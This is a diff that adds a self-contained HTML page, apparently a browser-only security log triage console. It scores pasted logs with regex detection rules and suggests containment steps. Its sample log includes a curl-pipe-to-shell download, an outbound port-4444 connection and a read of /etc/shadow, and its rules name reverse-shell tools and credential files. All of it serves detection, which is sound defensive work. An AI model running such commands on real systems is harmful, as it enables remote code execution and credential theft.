@@ -1,0 +1,87 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Singularity Witness Core — Local Defense Triage</title>
+<style>
+:root{--bg:#08080a;--panel:#111116;--ink:#f3f0ea;--muted:#9a948b;--line:#292730;--red:#ff3158;--amber:#ffb000;--cyan:#37e8ff;--green:#58ff9b;--violet:#9b5cff;--white:#fff}*{box-sizing:border-box}body{margin:0;background:radial-gradient(circle at 50% 0,#1a1018 0,#08080a 42%,#030305 100%);color:var(--ink);font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,sans-serif}header{padding:34px clamp(18px,4vw,56px);border-bottom:1px solid var(--line);background:linear-gradient(90deg,rgba(255,49,88,.12),rgba(55,232,255,.06),transparent)}.kicker{font-family:ui-monospace,Menlo,monospace;color:var(--cyan);letter-spacing:.18em;text-transform:uppercase;font-size:12px}h1{font-size:clamp(38px,7vw,92px);line-height:.88;margin:12px 0 12px;letter-spacing:-.07em;text-transform:uppercase}.sub{max-width:900px;color:#c9c2b9;font-size:clamp(16px,2vw,21px);line-height:1.45}.wrap{display:grid;grid-template-columns:minmax(320px,520px) 1fr;gap:18px;padding:18px clamp(14px,3vw,34px)}@media(max-width:980px){.wrap{grid-template-columns:1fr}}.card{background:rgba(17,17,22,.86);border:1px solid var(--line);box-shadow:0 20px 60px rgba(0,0,0,.35);border-radius:20px;padding:18px}.card h2{margin:0 0 12px;text-transform:uppercase;letter-spacing:.08em;font-size:15px;color:#fff}textarea{width:100%;height:340px;background:#050507;color:#f6f1e8;border:1px solid #2d2a32;border-radius:14px;padding:14px;font-family:ui-monospace,Menlo,monospace;font-size:13px;line-height:1.45;resize:vertical}button{border:1px solid #403b46;background:#191820;color:#fff;border-radius:12px;padding:12px 14px;font-weight:800;text-transform:uppercase;letter-spacing:.08em;cursor:pointer}button:hover{border-color:var(--cyan);box-shadow:0 0 20px rgba(55,232,255,.18)}button.primary{background:linear-gradient(135deg,#ff3158,#9b5cff);border:0}.row{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px}.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}.stat{background:#08080b;border:1px solid var(--line);border-radius:16px;padding:14px}.stat .n{font-size:30px;font-weight:900;letter-spacing:-.05em}.stat .l{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.12em}.viz{height:360px;position:relative;overflow:hidden;background:radial-gradient(circle at center,rgba(55,232,255,.08),rgba(255,49,88,.04),transparent 58%);border-radius:18px;border:1px solid #25232a}.core{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);width:86px;height:86px;border-radius:50%;background:radial-gradient(circle,#fff 0,#dffaff 12%,#37e8ff 35%,rgba(55,232,255,.05) 72%);box-shadow:0 0 42px rgba(55,232,255,.8),0 0 110px rgba(255,49,88,.35);display:flex;align-items:center;justify-content:center;color:#020205;font-size:44px;font-weight:1000}.shell{position:absolute;left:50%;top:50%;border:1px solid rgba(255,255,255,.16);border-radius:50%;transform:translate(-50%,-50%);animation:pulse 3.8s ease-in-out infinite}.shell.red{border-color:rgba(255,49,88,.45);box-shadow:0 0 28px rgba(255,49,88,.18)}.shell.cyan{border-color:rgba(55,232,255,.32);box-shadow:0 0 25px rgba(55,232,255,.13)}@keyframes pulse{50%{transform:translate(-50%,-50%) scale(1.045);opacity:.65}}.ray{position:absolute;height:2px;background:linear-gradient(90deg,transparent,var(--red),var(--cyan),transparent);transform-origin:left center;opacity:.65}.pill{display:inline-flex;align-items:center;gap:8px;border:1px solid #34313a;border-radius:999px;padding:7px 10px;font-family:ui-monospace,Menlo,monospace;font-size:12px;color:#ddd;background:#08080b}.risk-low{color:var(--green)}.risk-med{color:var(--amber)}.risk-high{color:var(--red)}table{width:100%;border-collapse:collapse;font-size:13px}th,td{border-bottom:1px solid #26232b;padding:10px;text-align:left;vertical-align:top}th{color:#bcb4aa;text-transform:uppercase;font-size:11px;letter-spacing:.12em}code{font-family:ui-monospace,Menlo,monospace;background:#08080b;border:1px solid #2b2830;padding:2px 6px;border-radius:6px}.small{font-size:13px;color:var(--muted);line-height:1.5}.finding{border-left:3px solid var(--cyan);padding:10px 12px;background:#09090c;border-radius:0 10px 10px 0;margin:10px 0}.finding.high{border-color:var(--red)}.finding.med{border-color:var(--amber)}footer{padding:26px;color:#7d756e;text-align:center;font-size:12px}</style>
+</head>
+<body>
+<header>
+<div class="kicker">)))((((((((!))))))))((( / converted into utility</div>
+<h1>Singularity<br/>Defense Triage</h1>
+<div class="sub">A local-only incident compression console. Paste logs, alerts, command history, access events, or suspicious text. The core compresses noise into a witness report: risk score, anomaly classes, timeline, containment advice, and exportable JSON.</div>
+</header>
+<div class="wrap">
+<section class="card">
+<h2>Input Stream</h2>
+<textarea id="input" spellcheck="false">2026-05-21T09:12:10Z auth: failed password for admin from 185.22.11.9
+2026-05-21T09:12:15Z auth: failed password for admin from 185.22.11.9
+2026-05-21T09:12:20Z auth: failed password for root from 185.22.11.9
+2026-05-21T09:13:02Z auth: accepted publickey for deploy from 10.0.0.5
+2026-05-21T09:14:42Z process: curl http://example.invalid/payload.sh | sh
+2026-05-21T09:15:01Z file: chmod +x /tmp/.x && /tmp/.x
+2026-05-21T09:15:10Z network: outbound connection to 45.77.12.3:4444
+2026-05-21T09:16:44Z user: sudo command by deploy: cat /etc/shadow
+2026-05-21T09:18:12Z persistence: cron entry added for /tmp/.x</textarea>
+<div class="row"><button class="primary" id="analyze">Compress to Witness Core</button><button id="sampleClean">Load Clean Sample</button><button id="exportJson">Export JSON</button><button id="clear">Clear</button></div>
+<p class="small">Runs entirely in browser. No network calls. This is a defensive triage aid, not a replacement for SIEM, EDR, or forensic tooling.</p>
+</section>
+<section class="card">
+<h2>Witness Core</h2>
+<div class="viz" id="viz"><div class="core">!</div></div>
+<div class="row" id="badges"></div>
+</section>
+</div>
+<div class="wrap">
+<section class="card">
+<h2>Score</h2>
+<div class="grid"><div class="stat"><div class="n" id="score">0</div><div class="l">Risk score</div></div><div class="stat"><div class="n" id="findingsCount">0</div><div class="l">Findings</div></div><div class="stat"><div class="n" id="eventsCount">0</div><div class="l">Events</div></div><div class="stat"><div class="n" id="phase">00</div><div class="l">Containment phase</div></div></div>
+<div id="summary"></div>
+</section>
+<section class="card">
+<h2>Recommended Response</h2>
+<div id="response"></div>
+</section>
+</div>
+<div class="wrap">
+<section class="card">
+<h2>Timeline</h2>
+<table><thead><tr><th>#</th><th>Signal</th><th>Why it matters</th></tr></thead><tbody id="timeline"></tbody></table>
+</section>
+<section class="card">
+<h2>Kernel Model</h2>
+<p class="small"><code>OUTER SHELL</code> filters noise. <code>INNER SHELL</code> maps known danger. <code>!</code> compresses evidence into a stable witness report. <code>00</code> is containment. <code>5</code> is restored operation.</p>
+<pre class="small" style="white-space:pre-wrap;background:#050507;border:1px solid #26232b;border-radius:14px;padding:14px">OBSERVE(stream)
+NORMALIZE(events)
+COMPRESS_TO_CORE(!)
+CLASSIFY(risk)
+CONTAIN(00) when risk high
+REPORT(actions)
+RESTORE(5) after evidence captured</pre>
+</section>
+</div>
+<footer>Singularity Witness Core — local defensive triage prototype.</footer>
+<script>
+const rules=[
+ {re:/failed password|authentication failure|invalid user/i,w:8,label:'auth-bruteforce',why:'Repeated failed authentication suggests brute-force or credential probing.'},
+ {re:/accepted publickey|successful login|session opened/i,w:4,label:'login',why:'Successful access event; review whether source, user, and timing are expected.'},
+ {re:/curl .*\|\s*sh|wget .*\|\s*sh|powershell.*iex|Invoke-WebRequest/i,w:18,label:'remote-exec',why:'Download-and-execute pattern is high-risk and commonly used for unauthorized code execution.'},
+ {re:/\/tmp\/\.|chmod \+x|\.exe|rundll32|regsvr32/i,w:12,label:'suspicious-execution',why:'Execution from temporary or hidden paths is suspicious and should be investigated.'},
+ {re:/4444|1337|6667|reverse shell|nc -e|bash -i/i,w:15,label:'c2-indicator',why:'Potential command-and-control or reverse-shell indicator.'},
+ {re:/\/etc\/shadow|SAM|ntds\.dit|credential|token|ssh\/id_rsa/i,w:15,label:'credential-access',why:'Access to credential stores or secrets indicates possible privilege escalation.'},
+ {re:/cron|systemd|launchd|RunKey|startup|persistence/i,w:13,label:'persistence',why:'Persistence mechanism detected; verify authorization and remove if malicious.'},
+ {re:/sudo|administrator|privilege|root/i,w:8,label:'privilege',why:'Privileged action detected; correlate with approved admin activity.'},
+ {re:/outbound|connection to|POST|beacon|dns/i,w:7,label:'network',why:'Network activity can indicate exfiltration or command channel behavior.'}
+];
+let lastReport=null;
+function analyze(){const text=document.getElementById('input').value;const lines=text.split(/\n+/).map(x=>x.trim()).filter(Boolean);let findings=[];let score=0;let tags=new Set();let timeline=[];lines.forEach((line,i)=>{let matched=[];for(const r of rules){if(r.re.test(line)){score+=r.w;tags.add(r.label);matched.push(r)}}if(matched.length){timeline.push({i:i+1,line,matched});matched.forEach(m=>findings.push({severity:m.w>=15?'high':m.w>=10?'med':'low',label:m.label,why:m.why,line}))}});let repeatedFailed=(text.match(/failed password|authentication failure|invalid user/gi)||[]).length;if(repeatedFailed>=3){score+=14;tags.add('repetition');findings.push({severity:'med',label:'repetition',why:'Multiple related failures increase confidence that this is not random noise.',line:`${repeatedFailed} failed auth-like events`})}score=Math.min(100,score);let phase=score>=70?'00':score>=35?'0/1':'5';lastReport={generated:new Date().toISOString(),score,phase,events:lines.length,tags:[...tags],findings,timeline:timeline.map(t=>({index:t.i,line:t.line,labels:t.matched.map(m=>m.label)}))};render(lastReport)}
+function render(r){document.getElementById('score').textContent=r.score;document.getElementById('score').className='n '+(r.score>=70?'risk-high':r.score>=35?'risk-med':'risk-low');document.getElementById('findingsCount').textContent=r.findings.length;document.getElementById('eventsCount').textContent=r.events;document.getElementById('phase').textContent=r.phase;document.getElementById('badges').innerHTML=r.tags.map(t=>`<span class="pill">${t}</span>`).join('')||'<span class="pill">no suspicious tags</span>';document.getElementById('summary').innerHTML=`<div class="finding ${r.score>=70?'high':r.score>=35?'med':''}"><b>${r.score>=70?'Contain now':r.score>=35?'Investigate':'Monitor'}</b><br><span class="small">${r.score>=70?'High confidence anomaly cluster. Preserve evidence, isolate affected host/account, rotate exposed credentials, then eradicate persistence.':r.score>=35?'Suspicious signals present. Correlate with asset owner, change window, and source IP reputation.':'No high-risk pattern detected in this input.'}</span></div>`;document.getElementById('response').innerHTML=responseFor(r);document.getElementById('timeline').innerHTML=r.timeline.map(t=>`<tr><td>${t.index}</td><td><code>${escapeHtml(t.line)}</code></td><td>${t.labels.join(', ')}</td></tr>`).join('')||'<tr><td colspan="3">No flagged events.</td></tr>';drawRays(r)}
+function responseFor(r){let steps=r.score>=70?['Move host/account to containment group or disable access temporarily.','Capture volatile evidence: active sessions, running processes, network sockets, recent file changes.','Rotate credentials associated with flagged accounts.','Remove unauthorized persistence only after evidence capture.','Write final incident report with timeline and hashes.']:r.score>=35?['Validate whether events match approved activity.','Check source IPs, user ownership, and change tickets.','Increase monitoring for recurrence.','Prepare containment if the same tags repeat.']:['Keep baseline.','Archive report.','No containment needed from this sample.'];return '<ol>'+steps.map(s=>`<li>${s}</li>`).join('')+'</ol>'}
+function drawRays(r){const viz=document.getElementById('viz');viz.querySelectorAll('.shell,.ray').forEach(e=>e.remove());for(let i=0;i<7;i++){const s=document.createElement('div');s.className='shell '+(i%2?'red':'cyan');let size=120+i*42;s.style.width=s.style.height=size+'px';s.style.animationDelay=(-i*.31)+'s';viz.appendChild(s)}let n=Math.min(36,Math.max(6,r.findings.length*3));for(let i=0;i<n;i++){const ray=document.createElement('div');ray.className='ray';ray.style.left='50%';ray.style.top='50%';ray.style.width=(110+Math.random()*220)+'px';ray.style.transform=`rotate(${Math.random()*360}deg) translateX(${40+Math.random()*60}px)`;ray.style.opacity=r.score/160+.18;viz.appendChild(ray)}}
+function escapeHtml(s){return s.replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]))}
+document.getElementById('analyze').onclick=analyze;document.getElementById('clear').onclick=()=>{document.getElementById('input').value='';analyze()};document.getElementById('sampleClean').onclick=()=>{document.getElementById('input').value='2026-05-21T10:00:00Z auth: accepted publickey for alice from 10.0.0.22\n2026-05-21T10:05:00Z backup: completed successfully\n2026-05-21T10:20:00Z patch: package update finished\n2026-05-21T10:30:00Z monitor: heartbeat ok';analyze()};document.getElementById('exportJson').onclick=()=>{if(!lastReport)analyze();const blob=new Blob([JSON.stringify(lastReport,null,2)],{type:'application/json'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='singularity-witness-report.json';a.click();URL.revokeObjectURL(a.href)};analyze();
+</script>
+</body>
+</html>
